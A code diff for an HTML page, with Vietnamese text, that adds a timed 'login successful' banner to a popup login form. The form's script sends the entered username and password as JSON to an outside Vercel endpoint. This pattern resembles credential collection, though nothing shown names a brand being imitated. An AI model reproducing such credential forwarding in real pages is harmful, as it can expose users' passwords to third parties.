@@ -58,6 +58,19 @@
       background: rgba(0, 0, 0, 0.4);
       z-index: 99;
     }
+    #successMessage {
+      display: none;
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #4CAF50;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 200;
+    }
   </style>
 </head>
 <body>
@@ -78,6 +91,10 @@
     </form>
   </div>
 
+  <div id="successMessage">
+    ✅ Đăng nhập thành công!
+  </div>
+
   <script>
     function showLogin() {
       document.getElementById('loginPopup').style.display = 'block';
@@ -96,14 +113,19 @@
       const password = document.getElementById('password').value;
 
       const xhr = new XMLHttpRequest();
-      // Địa chỉ API đã được cập nhật đúng
       xhr.open('POST', 'https://figurii1.vercel.app/api/submit', true); 
       xhr.setRequestHeader('Content-Type', 'application/json');
 
       xhr.onload = function() {
         if (xhr.status >= 200 && xhr.status < 300) {
           console.log('✅ Dữ liệu đã được gửi:', xhr.responseText);
-          hideLogin(); // Ẩn form nếu gửi thành công
+          hideLogin();
+
+          const msg = document.getElementById('successMessage');
+          msg.style.display = 'block';
+          setTimeout(() => {
+            msg.style.display = 'none';
+          }, 3000);
         } else {
           console.error('❌ Lỗi khi gửi dữ liệu:', xhr.statusText);
         }
@@ -113,7 +135,6 @@
         console.error('❌ Lỗi kết nối hoặc CORS bị chặn');
       };
 
-      // Gửi dữ liệu JSON
       xhr.send(JSON.stringify({ username, password }));
     });
   </script>
